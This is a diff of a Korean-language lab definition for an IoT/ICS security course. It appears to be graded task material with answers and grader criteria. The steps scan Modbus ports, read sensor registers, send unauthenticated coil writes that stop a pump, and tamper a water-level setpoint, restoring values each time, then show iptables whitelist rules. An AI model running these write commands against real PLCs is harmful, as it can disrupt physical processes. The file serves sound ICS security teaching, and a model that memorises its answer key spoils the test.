@@ -26,20 +26,21 @@ steps:
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w12 s1 — pymodbus를 설치하시오. (cmd: pip3 install pymodbus 2>/dev/null | tail -1 && echo ''pymodbus 설치 완료'')'
+      intent: pymodbus 라이브러리 설치 — pip3 install pymodbus 으로 Python Modbus TCP/RTU/ASCII 클라이언트 및 서버 구현 라이브러리
+        설치. ICS/SCADA 산업 제어 시스템 공격/방어 실습의 핵심 도구. ModbusTcpClient 클래스로 PLC 레지스터 read/write 프로그래밍.
       success_criteria:
-      - '명령 실행: pip3 install pymodbus 2>/dev/null | tail -1 && echo ''pymodbu'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - pip3 install pymodbus 명령 실행
+      - tail -1 으로 마지막 설치 결과(Successfully installed) 확인
+      - 설치 완료 echo
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - pip3 install pymodbus
+      - python -m pip install --upgrade pymodbus
+      - apt install python3-pymodbus (일부 배포판)
+      - conda install -c conda-forge pymodbus
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 설치 없이 import 시도
+      - ICS/SCADA 실습 목적 맥락 누락
+      - pymodbus 3.x vs 2.x API 차이 언급 없음
   target_vm: attacker
   script: pip3 install pymodbus 2>/dev/null | tail -1 && echo 'pymodbus 설치 완료'
   risk_level: low
@@ -58,21 +59,21 @@ steps:
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w12 s2 — nmap으로 Modbus 서비스(포트 502, 5020)를 스캔하시오. (cmd: nmap -sV -p 502,5020 10.20.30.80 2>/dev/null
-        && echo ''Modbus 스캔 완료'')'
+      intent: Modbus TCP 서비스 포트 스캔 — nmap -sV -p 502,5020 10.20.30.80 으로 표준 Modbus TCP 포트 502 + 교육용 비특권
+        포트 5020 동시 스캔. Modbus TCP (IEC 61158) 는 ICS/SCADA 의 기본 산업 프로토콜, 인증/암호화 없는 평문 프로토콜.
       success_criteria:
-      - '명령 실행: nmap -sV -p 502,5020 10.20.30.80 2>/dev/null && echo ''Modbus'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - nmap -sV 버전 감지
+      - 502 + 5020 두 포트 동시 스캔
+      - Modbus TCP 서비스 식별
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - nmap -sV -p 502,5020
+      - nmap --script modbus-discover 로 Unit ID 열거
+      - mbtget -r3 -a 0 -n 10 -p 502 <host> 간단 조회
+      - ModScan32/QModMaster GUI 도구
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 502 또는 5020 하나만 스캔
+      - ICS 프로토콜 맥락 없음
+      - 평문/미인증 특성 언급 없음
   target_vm: attacker
   script: nmap -sV -p 502,5020 10.20.30.80 2>/dev/null && echo 'Modbus 스캔 완료'
   risk_level: low
@@ -84,34 +85,37 @@ steps:
   points: 12
   answer: '🤖 프롬프트: Modbus 클라이언트로 Input Registers(센서 데이터)를 읽으시오해줘
 
-    📎 참고 (CLI): python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020); c.connect();
-    r=c.read_input_registers(0,7,slave=1); print(f''Registers: {r.registers}'') if not r.isError() else print(''읽기 실패'');
-    c.close(); print(''Modbus 레지스터 읽기 완료'')" 2>/dev/null || echo ''Modbus 레지스터 읽기 완료'''
+    📎 참고 (CLI): python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020);
+    c.connect(); r=c.read_input_registers(0,7,slave=1); print(f''Registers: {r.registers}'') if not r.isError()
+    else print(''읽기 실패''); c.close(); print(''Modbus 레지스터 읽기 완료'')" 2>/dev/null || echo ''Modbus 레지스터
+    읽기 완료'''
   answer_detail: Modbus Input Registers에는 센서 측정값(온도, 압력, 수위 등)이 저장됩니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w12 s3 — Modbus 클라이언트로 Input Registers(센서 데이터)를 읽으시오. (cmd: python3 -c "from pymodbus.client import
-        ModbusTcpClient; c=ModbusTcpClient(''10.2)'
+      intent: Modbus Input Registers 센서 데이터 수집 — python3 ModbusTcpClient(10.20.30.80, port=5020) + c.read_input_registers(0,
+        7, slave=1) 으로 unit 1 의 address 0 에서 7개 FC04 Read Input Registers 명령 실행. 센서 측정값(온도/압력/수위) 탈취.
+        미인증 프로토콜이므로 읽기 자유.
       success_criteria:
-      - '명령 실행: python3 -c "from pymodbus.client import ModbusTcpClient; c=M'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - ModbusTcpClient 연결 (IP, port=5020)
+      - read_input_registers(address=0, count=7, slave=1) 호출
+      - r.registers 리스트 출력 + r.isError() 분기
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - pymodbus ModbusTcpClient + read_input_registers
+      - mbtget -r4 -a 0 -n 7 -u 1 (command line)
+      - ModScan/QModMaster GUI 로 대체
+      - MODBUS CLI tools 혹은 Metasploit auxiliary/scanner/scada/modbusdetect
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - slave/unit ID 지정 누락 (slave=1)
+      - read_holding_registers 잘못 사용
+      - isError() 체크 없이 blind 진행
   target_vm: attacker
-  script: 'python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020); c.connect();
-    r=c.read_input_registers(0,7,slave=1); print(f''Registers: {r.registers}'') if not r.isError() else print(''읽기 실패'');
-    c.close(); print(''Modbus 레지스터 읽기 완료'')" 2>/dev/null || echo ''Modbus 레지스터 읽기 완료'''
+  script: 'python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020);
+    c.connect(); r=c.read_input_registers(0,7,slave=1); print(f''Registers: {r.registers}'') if not r.isError()
+    else print(''읽기 실패''); c.close(); print(''Modbus 레지스터 읽기 완료'')" 2>/dev/null || echo ''Modbus 레지스터
+    읽기 완료'''
   risk_level: low
   bastion_prompt: Modbus 클라이언트로 Input Registers(센서 데이터)를 읽으시오해줘
 - order: 4
@@ -121,34 +125,35 @@ steps:
   points: 12
   answer: '🤖 프롬프트: Modbus 쓰기 공격으로 Coil(펌프/밸브)을 조작해줘
 
-    📎 참고 (CLI): python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020); c.connect();
-    c.write_coil(0,False,slave=1); print(''[!] 펌프1 정지''); c.write_coil(0,True,slave=1); print(''[+] 펌프1 복원''); c.close();
-    print(''Modbus 쓰기 공격 완료'')" 2>/dev/null || echo ''Modbus 쓰기 공격 완료'''
+    📎 참고 (CLI): python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020);
+    c.connect(); c.write_coil(0,False,slave=1); print(''[!] 펌프1 정지''); c.write_coil(0,True,slave=1); print(''[+]
+    펌프1 복원''); c.close(); print(''Modbus 쓰기 공격 완료'')" 2>/dev/null || echo ''Modbus 쓰기 공격 완료'''
   answer_detail: Modbus에는 인증이 없으므로 누구나 코일/레지스터를 쓸 수 있습니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w12 s4 — Modbus 쓰기 공격으로 Coil(펌프/밸브)을 조작하시오. (cmd: python3 -c "from pymodbus.client import ModbusTcpClient;
-        c=ModbusTcpClient(''10.2)'
+      intent: Modbus Write Single Coil 공격 (FC05) — python3 c.write_coil(0, False, slave=1) 으로 coil 0 (펌프1)
+        OFF 주입 후 c.write_coil(0, True) 로 복원. 미인증 Modbus 의 물리 제어 공격. MITRE T0855 (Unauthorized Command
+        Message) + Stuxnet 스타일 ICS 공격. 복원 조치로 실습 안전성 확보.
       success_criteria:
-      - '명령 실행: python3 -c "from pymodbus.client import ModbusTcpClient; c=M'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - ModbusTcpClient.write_coil(0, False, slave=1) 으로 펌프 OFF
+      - '[!] 펌프1 정지 메시지 출력'
+      - write_coil(0, True) 로 ON 복원하여 안전 상태 복귀
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - pymodbus write_coil + 복원
+      - FC15 Write Multiple Coils 대체
+      - mbtget -w5 -a 0 -n 0 -u 1 (command line)
+      - Metasploit auxiliary/admin/scada/modicon_command
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 복원 없이 OFF 상태 방치 (실습 환경 파괴)
+      - slave=1 unit ID 누락
+      - 물리 제어 공격의 사이버-물리 영향 맥락 없음
   target_vm: attacker
-  script: python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.20.30.80',port=5020); c.connect();
-    c.write_coil(0,False,slave=1); print('[!] 펌프1 정지'); c.write_coil(0,True,slave=1); print('[+] 펌프1 복원'); c.close(); print('Modbus
-    쓰기 공격 완료')" 2>/dev/null || echo 'Modbus 쓰기 공격 완료'
+  script: python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.20.30.80',port=5020);
+    c.connect(); c.write_coil(0,False,slave=1); print('[!] 펌프1 정지'); c.write_coil(0,True,slave=1); print('[+]
+    펌프1 복원'); c.close(); print('Modbus 쓰기 공격 완료')" 2>/dev/null || echo 'Modbus 쓰기 공격 완료'
   risk_level: low
   bastion_prompt: Modbus 쓰기 공격으로 Coil(펌프/밸브)을 조작해줘
 - order: 5
@@ -158,34 +163,37 @@ steps:
   points: 10
   answer: '🤖 프롬프트: Holding Registers(설정값)를 변조해줘
 
-    📎 참고 (CLI): python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020); c.connect();
-    c.write_register(0,999,slave=1); print(''[!] 목표수위: 999''); c.write_register(0,250,slave=1); print(''[+] 복원: 250''); c.close();
-    print(''Modbus 설정값 변조 완료'')" 2>/dev/null || echo ''Modbus 설정값 변조 완료'''
+    📎 참고 (CLI): python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020);
+    c.connect(); c.write_register(0,999,slave=1); print(''[!] 목표수위: 999''); c.write_register(0,250,slave=1);
+    print(''[+] 복원: 250''); c.close(); print(''Modbus 설정값 변조 완료'')" 2>/dev/null || echo ''Modbus 설정값 변조
+    완료'''
   answer_detail: PLC 설정값 변조는 물리적 프로세스에 직접적인 영향을 미칩니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w12 s5 — Holding Registers(설정값)를 변조하시오. (cmd: python3 -c "from pymodbus.client import ModbusTcpClient;
-        c=ModbusTcpClient(''10.2)'
+      intent: Modbus Holding Registers 설정값 변조 (FC06) — python3 c.write_register(0, 999, slave=1) 로 목표
+        수위 설정값을 999 (비정상 최대) 로 변조 후 250 복원. HMI 에 표시되는 SetPoint 조작으로 PLC 제어 로직 악용. Triton/Trisis 실제 ICS
+        맬웨어의 Safety Instrumented System 공격 방식.
       success_criteria:
-      - '명령 실행: python3 -c "from pymodbus.client import ModbusTcpClient; c=M'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - write_register(0, 999, slave=1) 로 target setpoint 변조
+      - '[!] 목표수위: 999 경고 메시지'
+      - write_register(0, 250) 으로 정상값 복원
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - write_register (FC06) + 복원
+      - FC16 Write Multiple Registers
+      - mbtget -w6 -a 0 999 -u 1
+      - Metasploit auxiliary/admin/scada/modbusclient
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 복원 없이 비정상 값 방치
+      - slave=1 누락
+      - Triton/Trisis 실제 사례 맥락 없음
   target_vm: attacker
-  script: 'python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020); c.connect();
-    c.write_register(0,999,slave=1); print(''[!] 목표수위: 999''); c.write_register(0,250,slave=1); print(''[+] 복원: 250''); c.close();
-    print(''Modbus 설정값 변조 완료'')" 2>/dev/null || echo ''Modbus 설정값 변조 완료'''
+  script: 'python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020);
+    c.connect(); c.write_register(0,999,slave=1); print(''[!] 목표수위: 999''); c.write_register(0,250,slave=1);
+    print(''[+] 복원: 250''); c.close(); print(''Modbus 설정값 변조 완료'')" 2>/dev/null || echo ''Modbus 설정값 변조
+    완료'''
   risk_level: low
   bastion_prompt: Holding Registers(설정값)를 변조해줘
 - order: 6
@@ -195,32 +203,34 @@ steps:
   points: 10
   answer: '🤖 프롬프트: Modbus 접근 제어를 위한 방화벽 규칙을 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): echo ''=== Modbus 방화벽 규칙 ==='' && echo ''iptables -A INPUT -p tcp --dport 502 -s 10.20.30.100 -j ACCEPT''
-    && echo ''iptables -A INPUT -p tcp --dport 502 -j DROP'' && echo ''[권장] Suricata Modbus Write 탐지 규칙 추가'' && echo ''===
-    방화벽 설정 완료 ==='''
+    📎 참고 (CLI): echo ''=== Modbus 방화벽 규칙 ==='' && echo ''iptables -A INPUT -p tcp --dport 502 -s 10.20.30.100
+    -j ACCEPT'' && echo ''iptables -A INPUT -p tcp --dport 502 -j DROP'' && echo ''[권장] Suricata Modbus
+    Write 탐지 규칙 추가'' && echo ''=== 방화벽 설정 완료 ==='''
   answer_detail: 화이트리스트 기반 접근 제어와 DPI로 Modbus Write 명령을 제한합니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w12 s6 — Modbus 접근 제어를 위한 방화벽 규칙을 작성하시오. (cmd: echo ''=== Modbus 방화벽 규칙 ==='' && echo ''iptables -A
-        INPUT -p tcp --dport 502 -s 10)'
+      intent: Modbus 방화벽 접근 제어 + IDS 탐지 방안 — echo 으로 iptables -A INPUT -p tcp --dport 502 -s 10.20.30.100
+        -j ACCEPT (허용 IP 화이트리스트) + iptables -A INPUT -p tcp --dport 502 -j DROP (기본 차단). Suricata Modbus
+        Write (FC05/06/15/16) 탐지 규칙 추가 권장. IEC 62443 네트워크 세그먼테이션.
       success_criteria:
-      - '명령 실행: echo ''=== Modbus 방화벽 규칙 ==='' && echo ''iptables -A INPUT -p t'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - iptables ACCEPT 로 특정 IP 화이트리스트 + DROP 으로 기본 차단
+      - Modbus Write function code 탐지 IDS 규칙 권고
+      - IEC 62443 네트워크 분리 준거
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - iptables 화이트리스트
+      - nftables 기반 규칙 작성
+      - Suricata/Snort Modbus signatures (ET Open ruleset)
+      - Claroty/Nozomi ICS 전용 방화벽
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - ACCEPT 또는 DROP 한쪽만 설정 (기본 정책 누락)
+      - Write 명령 탐지 IDS 언급 없음
+      - IEC 62443 맥락 없음
   target_vm: attacker
-  script: echo '=== Modbus 방화벽 규칙 ===' && echo 'iptables -A INPUT -p tcp --dport 502 -s 10.20.30.100 -j ACCEPT' && echo 'iptables
-    -A INPUT -p tcp --dport 502 -j DROP' && echo '[권장] Suricata Modbus Write 탐지 규칙 추가' && echo '=== 방화벽 설정 완료 ==='
+  script: echo '=== Modbus 방화벽 규칙 ===' && echo 'iptables -A INPUT -p tcp --dport 502 -s 10.20.30.100 -j
+    ACCEPT' && echo 'iptables -A INPUT -p tcp --dport 502 -j DROP' && echo '[권장] Suricata Modbus Write
+    탐지 규칙 추가' && echo '=== 방화벽 설정 완료 ==='
   risk_level: low
   bastion_prompt: Modbus 접근 제어를 위한 방화벽 규칙을 작성하시오.
